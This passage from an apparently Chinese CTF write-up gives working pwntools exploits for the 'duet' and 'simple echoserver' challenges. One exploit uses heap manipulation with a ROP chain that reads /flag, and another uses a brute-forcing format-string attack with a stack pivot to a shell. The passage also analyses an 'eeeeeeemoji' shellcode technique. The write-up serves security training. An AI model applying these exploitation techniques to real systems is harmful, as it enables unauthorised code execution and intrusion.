class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instr</span><span class="params">(i)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">      p.sendlineafter(<span class="string">"Instrument: "</span>,<span class="string">"\xe7\x90\xb4"</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      p.sendlineafter(<span class="string">"Instrument: "</span>,<span class="string">"\xe7\x91\x9f"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,l,note)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,<span class="string">"1"</span>)</span><br><span class="line">    instr(index)</span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,str(l))</span><br><span class="line">    p.sendafter(<span class="string">": "</span>,note.ljust(l,<span class="string">"\x00"</span>))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,<span class="string">"2"</span>)</span><br><span class="line">    instr(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,<span class="string">"3"</span>)</span><br><span class="line">    instr(index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(i)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    p.recv(i)</span><br><span class="line">    <span class="keyword">return</span> u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span><span class="params">(l)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,<span class="string">"5"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,str(l))</span><br><span class="line"><span class="comment">#p=process("./duet")</span></span><br><span class="line">p=remote(<span class="string">"pwnable.org"</span>,<span class="number">12356</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">"a"</span>*<span class="number">0x88</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">"a"</span>*<span class="number">0x400</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x3f8</span>,<span class="string">"a"</span>*<span class="number">0x3f8</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0xf8</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x1e8</span>,<span class="string">"a"</span>*<span class="number">0x1e8</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x108</span>,<span class="string">"a"</span>*<span class="number">0x108</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x178</span>,<span class="string">"a"</span>*<span class="number">0x178</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">"a"</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf8</span>,<span class="string">"1"</span>*<span class="number">0xf8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">magic(<span class="number">0xf1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x178</span>,p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)*<span class="number">17</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>,<span class="string">"1"</span>*<span class="number">0xf8</span>+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc=leak(<span class="number">0x10</span>)<span class="number">-0x1e4ca0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x308</span>,<span class="string">"a"</span>*<span class="number">0x270</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+<span class="string">"aaaaaaaa"</span>*<span class="number">16</span>+p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1e8</span>,<span class="string">"5"</span>*<span class="number">0xf8</span>+p64(<span class="number">0x401</span>)+p64(libc+<span class="number">0x1e4ca0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)*<span class="number">27</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x3f8</span>,(p64(<span class="number">0</span>)*<span class="number">29</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)).ljust(<span class="number">0x170</span>,<span class="string">"a"</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x301</span>)+p64(libc<span class="number">-0x7ffff7de1000</span>+<span class="number">0x7ffff7fc5c30</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">""</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap=leak(<span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line">payload1=p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555562c70</span>)+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555562c70</span>+<span class="number">334</span>)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555562f70</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555562c30</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc<span class="number">-0x7ffff7de1000</span>+<span class="number">0x7FFFF7FC7620</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload1+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">"a"</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload1+=<span class="string">"/flag\x00\x00\x00"</span></span><br><span class="line">payload1+=p64(libc+<span class="number">0x26542</span>)+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555562cb0</span>)+p64(libc+<span class="number">0x026f9e</span>)+p64(<span class="number">0</span>)+p64(libc+<span class="number">0x47cf8</span>)+p64(<span class="number">2</span>)+p64(libc<span class="number">-0x7ffff7de1000</span>+<span class="number">0x7FFFF7EEDF7F</span>)</span><br><span class="line">payload1+=p64(libc+<span class="number">0x26542</span>)+p64(<span class="number">3</span>)+p64(libc+<span class="number">0x026f9e</span>)+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555563120</span>)+p64(libc+<span class="number">0x012bda6</span>)+p64(<span class="number">0x30</span>)+p64(libc<span class="number">-0x7ffff7de1000</span>+<span class="number">0x7FFFF7EEDF70</span>)</span><br><span class="line">payload1+=p64(libc+<span class="number">0x26542</span>)+p64(<span class="number">1</span>)+p64(libc+<span class="number">0x026f9e</span>)+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555563120</span>)+p64(libc+<span class="number">0x012bda6</span>)+p64(<span class="number">0x30</span>)+p64(libc<span class="number">-0x7ffff7de1000</span>+<span class="number">0x7FFFF7EEE010</span>)</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555563280</span>)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555563090</span>)+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555563090</span>+<span class="number">334</span>)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555563120</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555562c30</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc<span class="number">-0x7ffff7de1000</span>+<span class="number">0x7FFFF7FC7620</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(libc<span class="number">-0x7ffff7de1000</span>+<span class="number">0x07FFFF7E36E35</span>)+<span class="string">"a"</span>*<span class="number">0x10</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555563280</span><span class="number">-0xa0</span>)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555563090</span>)+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555563090</span>+<span class="number">334</span>)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x5555555630d0</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555562c30</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(libc<span class="number">-0x7ffff7de1000</span>+<span class="number">0x7FFFF7FC7620</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(libc<span class="number">-0x7ffff7de1000</span>+<span class="number">0x7ffff7e642f0</span>)+<span class="string">"a"</span>*<span class="number">0x10</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload2+=p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x555555562cb0</span>)+p64(libc+<span class="number">0x26542</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x400</span>,payload1)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1e8</span>,<span class="string">"5"</span>*<span class="number">0xf8</span>+p64(<span class="number">0x401</span>)+p64(libc<span class="number">-0x7ffff7de1000</span>+<span class="number">0x00007ffff7fc6090</span>)*<span class="number">2</span>+p64(heap<span class="number">-0x5555555626c0</span>+<span class="number">0x005555555626c0</span>)+p64(libc<span class="number">-0x7ffff7de1000</span>+<span class="number">0x7ffff7fc66c8</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x158</span>,<span class="string">"7"</span>*<span class="number">0x158</span>)</span><br><span class="line"><span class="keyword">print</span> hex(heap),hex(libc)</span><br><span class="line">p.sendlineafter(<span class="string">": "</span>,<span class="string">"6"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="simple-echoserver"><a href="#simple-echoserver" class="headerlink" title="simple echoserver"></a>simple echoserver</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kirin@ubuntu:~&#x2F;tctf$ checksec .&#x2F;simple_echoserver.dms </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;kirin&#x2F;tctf&#x2F;simple_echoserver.dms&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>保护全开，存在格式化字符串漏洞：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall out_info(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  snprintf(user_info, 0x100uLL, &quot;[USER] name: %s; phone: %ld\n&quot;, a1, *(_QWORD *)(a1 + 256));</span><br><span class="line">  return fprintf(stderr, user_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是远程将stderr关闭/重定向了，没办法输出信息<br>考虑修改stderr._fileno=1来进行leak<br>所以先要在栈中构造一个stderr._fileno的地址<br>breakpoint到fprintf，查看栈空间：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50xg $rsp</span><br><span class="line">0x7fffffffddb8:	0x000055555555541a	0x0000000000000000</span><br><span class="line">0x7fffffffddc8:	0x0000555555558160	0x00007fffffffdef0</span><br><span class="line">0x7fffffffddd8:	0x0000555555555443	0x0000000000000000</span><br><span class="line">0x7fffffffdde8:	0x0000000000000000	0x00007fffffffdef0</span><br><span class="line">0x7fffffffddf8:	0x00007ffff7dcfa00	0x0000000000000d68</span><br><span class="line">0x7fffffffde08:	0x00007ffff7a71148	0x00000000f705fa00</span><br><span class="line">0x7fffffffde18:	0xffffffffffffffff	0x00005555555550f0</span><br><span class="line">0x7fffffffde28:	0x000000000000000a	0x00007fffffffded0</span><br><span class="line">0x7fffffffde38:	0x00005555555550f0	0x00007fffffffdff0</span><br><span class="line">0x7fffffffde48:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffde58:	0x0000555555555348	0x00007ffff7dcfa00</span><br><span class="line">0x7fffffffde68:	0x00007fffffffde74	0x0000000031313131</span><br><span class="line">0x7fffffffde78:	0x00007fffffffdff0	0x0000000000000000</span><br><span class="line">0x7fffffffde88:	0x00007ffff7a723f2	0x0000000000000036</span><br><span class="line">0x7fffffffde98:	0x0000555555558174	0x00007fffffffded0</span><br><span class="line">0x7fffffffdea8:	0x000055555555528d	0x0000010055556029</span><br><span class="line">0x7fffffffdeb8:	0x44b366f1c56b2e00	0x0000000000000000</span><br><span class="line">0x7fffffffdec8:	0x0000000000000000	0x00007fffffffdef0</span><br><span class="line">0x7fffffffded8:	0x00005555555553b3	0x00007fffffffdff0</span><br><span class="line">0x7fffffffdee8:	0x44b366f1c56b2e00	0x00007fffffffdf10</span><br><span class="line">0x7fffffffdef8:	0x00005555555554d0	0x00007fffffffdff0</span><br><span class="line">0x7fffffffdf08:	0x0000000000000000	0x00005555555554e0</span><br><span class="line">0x7fffffffdf18:	0x00007ffff7a05b97	0x0000000000000001</span><br><span class="line">0x7fffffffdf28:	0x00007fffffffdff8	0x0000000100008000</span><br><span class="line">0x7fffffffdf38:	0x00005555555554b2	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>首先要考虑：<br>需要多次复用来在栈中构造stderr._fileno的地址：第一次修改一个栈地址指向一个包含stderr附近地址(这里选择stdin，ASLR开启下大部分情况stdin和stderr只相差低2字节，爆破概率1/16)的栈地址，而后第二次写0x7fffffffde60处的stdin低字节指向&amp;stderr._fileno-1(便于直接写入1:输出0x100～0x1ff字节即可)，第三次修改stderr._fileno为1，最后一次栈迁移时:这里s1位于栈，有256字节可控，全部布置为one_target(测试0x4f2c5可以)，迁移栈到s1即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line">&#123;</span><br><span class="line">  readline_n(&amp;s1, 256);</span><br><span class="line">  if ( !strcmp(&amp;s1, &quot;~.&quot;) )</span><br><span class="line">    break;</span><br><span class="line">  printf(&quot;%s\n&quot;, &amp;s1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>复用：<br>不能直接使用0x7fffffffdf38处的main，后续会因为栈的对齐问题导致栈错误(类似system的movaps)<br>看到0x7fffffffdf0位置指向0x00007fffffffdf10：0x00005555555554e0，只需要修改低字节就可以改到main函数<br>或者，看到栈空间里存在0x00005555555550f0：start<br>有了能复用的地址后，利用rbp进行栈迁移，但是第一次不能迁移到0x00007fffffffdf10，因为需要进行多次修改才能获得stderr._fileno的地址，如果迁移到原来位置附近，再次调用到fprintf，上一次修改好的地址就会被覆盖掉，所以第一次需要迁移到start位置，这样中间相差的位置的地址就可以留下来多次修改<br>最后注意一下：</p>
<ul>
<li>栈迁移到含有start的位置，需要那个位置低地址第2字节和原来相同，这样只需要修改最后一字节即可，这种情况下需要1/16次爆破到可行的栈空间，成功后栈空间其实已经确定，也便于后续修改一个栈地址到保存stdin的栈位置，以及最后栈迁移到one_target位置</li>
<li>因为需要修改stdin到&amp;stderr._fileno-1，%n能修改的最大值为0x2000，且为了保证stdin和&amp;stderr._fileno-1高4字节都相同，选择：0x16ef</li>
</ul>
<p>这样一共1/256的几率getshell：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#name="%"+str(0xb2-0xd)+"c%43$hhn"+"%"+str(0xc8-0xb2)+"c"+"%7$hhn\n"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    name=<span class="string">"111%7$hhn%48c%33$hhn\n"</span></span><br><span class="line">    phone=<span class="string">"1111\n"</span></span><br><span class="line">    p=process(<span class="string">"./simple_echoserver.dms"</span>)</span><br><span class="line">    <span class="comment">#p=remote("pwnable.org",12020)</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendafter(<span class="string">"name: "</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">"phone: "</span>,phone)</span><br><span class="line">    p.sendafter(<span class="string">" yourself!"</span>,<span class="string">"~.\n"</span>)</span><br><span class="line">    name2=<span class="string">"%"</span>+str(<span class="number">0x38</span><span class="number">-0xd</span>)+<span class="string">"c"</span>+<span class="string">"%7$hhn"</span>+<span class="string">"%"</span>+str(<span class="number">0xb2</span><span class="number">-0x38</span>)+<span class="string">"c%43$hhn"</span>+<span class="string">"%"</span>+str(<span class="number">5871</span><span class="number">-0xb2</span>)+<span class="string">"c%93$hn\n"</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your name: "</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">    p.send(name2)</span><br><span class="line">    p.sendafter(<span class="string">"phone: "</span>,phone)</span><br><span class="line">    p.sendafter(<span class="string">" yourself!"</span>,<span class="string">"~.\n"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"name: "</span>,<span class="string">"%256c%79$n%243c%7$hhn %12$p\n"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"phone: "</span>,<span class="string">"111\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    libc=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-0x7f4dd68b0a00</span>+<span class="number">0x7f4dd64c5000</span></span><br><span class="line">    <span class="keyword">print</span> hex(libc)</span><br><span class="line">    p.recvuntil(<span class="string">" yourself!\n"</span>)</span><br><span class="line">    p.sendline(p64(libc+<span class="number">0x4f2c5</span>)*<span class="number">32</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendline(<span class="string">"~."</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">"fail"</span></span><br></pre></td></tr></table></figure>
<h2 id="eeeeeeemoji"><a href="#eeeeeeemoji" class="headerlink" title="eeeeeeemoji"></a>eeeeeeemoji</h2><p>可以溢出两字节两字节shellcode<br>只有rdx与mmap的地址有关<br>且mmap：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_mmap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = rand() % <span class="number">1000</span>;</span><br><span class="line">  dest = (<span class="keyword">wchar_t</span> *)mmap((<span class="keyword">void</span> *)(v0 &lt;&lt; <span class="number">12</span>), <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( dest == (<span class="keyword">wchar_t</span> *)<span class="number">-1L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    fputws(&amp;off_15A0, <span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  result = wprintf(&amp;format, dest);</span><br><span class="line">  byte_202030 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(rand() % 1000)&lt;&lt;12:地址长度较短<br>联想到指令xchg：既可以赋值，又可以清空rsp高字节<br>但是rdx位置没办法可控输入<br>可控的地方在mmap地址的起始位置：<br>想到使用and指令，来使得rsp控制为需要的值，只需要and esp,edx，此时高地址清零，只需要esp&amp;edx为一个预期值即可<br>shellcode在退出时候：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000000013AE                 add     rsp, 8000h      ; DATA XREF: sub_B91+1FF↑r</span><br><span class="line">.rodata:00000000000013AE                                         ; sub_DFE+1FF↑r</span><br><span class="line">.rodata:00000000000013B5                 pop     r15</span><br><span class="line">.rodata:00000000000013B7                 pop     r14             ; DATA XREF: sub_B91+206↑r</span><br><span class="line">.rodata:00000000000013B7                                         ; sub_DFE+206↑r</span><br><span class="line">.rodata:00000000000013B9                 pop     r13</span><br><span class="line">.rodata:00000000000013BB                 pop     r12</span><br><span class="line">.rodata:00000000000013BD                 pop     r11</span><br><span class="line">.rodata:00000000000013BF                 pop     r10             ; DATA XREF: sub_B91+215↑r</span><br><span class="line">.rodata:00000000000013BF                                         ; sub_DFE+215↑r</span><br><span class="line">.rodata:00000000000013C1                 pop     r9</span><br><span class="line">.rodata:00000000000013C3                 pop     r8</span><br><span class="line">.rodata:00000000000013C5                 pop     rbp</span><br><span class="line">.rodata:00000000000013C6                 pop     rsi</span><br><span class="line">.rodata:00000000000013C7                 pop     rdi</span><br><span class="line">.rodata:00000000000013C8</span><br><span class="line">.rodata:00000000000013C8 loc_13C8:                               ; DATA XREF: sub_B91+21C↑r</span><br><span class="line">.rodata:00000000000013C8                                         ; sub_DFE+21C↑r</span><br><span class="line">.rodata:00000000000013C8                 pop     rdx</span><br><span class="line">.rodata:00000000000013C9                 pop     rcx</span><br><span class="line">.rodata:00000000000013CA                 pop     rbx</span><br><span class="line">.rodata:00000000000013CB                 pop     rax</span><br><span class="line">.rodata:00000000000013CC                 popfq</span><br><span class="line">.rodata:00000000000013CD                 pop     rax</span><br><span class="line">.rodata:00000000000013CE                 cmp     rax, rsp        ; DATA XREF: sub_B91+22B↑r</span><br><span class="line">.rodata:00000000000013CE                                         ; sub_DFE+22B↑r</span><br><span class="line">.rodata:00000000000013D1                 jnz     short near ptr unk_13D4</span><br><span class="line">.rodata:00000000000013D3                 retn</span><br></pre></td></tr></table></figure>
<p>所以只需要mmap一个0x8000结尾的地址，and esp,edx时edx结尾为：0x8200<br>当esp&amp;edx后低地址为0x0000即可在shellcode返回时：add rsp,8000h =&gt; rsp就是mmap的起始地址，而后rop链getshell即可，这里因为编码问题，选择先用rop调用read，read一段shellcode进入mmap的空间，而后ret进入即可getshell:</p>
